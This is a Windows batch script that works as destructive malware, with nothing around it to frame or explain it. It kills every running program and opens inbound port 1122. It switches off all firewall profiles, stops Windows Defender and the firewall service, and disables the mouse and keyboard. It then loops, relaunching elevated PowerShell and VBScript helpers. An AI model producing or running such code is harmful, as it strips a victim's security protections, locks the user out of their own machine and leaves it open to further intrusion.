@echo off

:terminator
setlocal
for /f "tokens=2" %%a in ('tasklist ^| findstr /r /b ".*.exe"') do (
    taskkill /f /im "%%a"
)


:netsecurety
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=1122
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=1122
netsh advfirewall firewall set opmode disable
netsh advfirewall firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
net stop "Windows Defender Service"
net stop "Windows Firewall"


:disablekeyboardandmouse
setlocal enabledelayedexpansion
for /f "tokens=2 delims=," %%a in ('wmic path Win32_PointingDevice get Description^,DeviceID /format:csv ^| find "Mouse"') do (
    set device=%%a
    devcon disable "!device!"*
)

for /f "tokens=2 delims=," %%b in ('wmic path Win32_Keyboard get Description^,DeviceID /format:csv ^| find "Keyboard"') do (
    set device=%%b
    devcon disable "!device!"*
)


:duplication
PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'make_file.ps1' -Verb RunAs"


goto disablekeyboardandmouse
PowerShell.exe -ExecutionPolicy Bypass
PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'ShutNet.ps1' -Verb RunAs"
goto duplication
cscript main.vbs
goto netsecurety
goto terminator
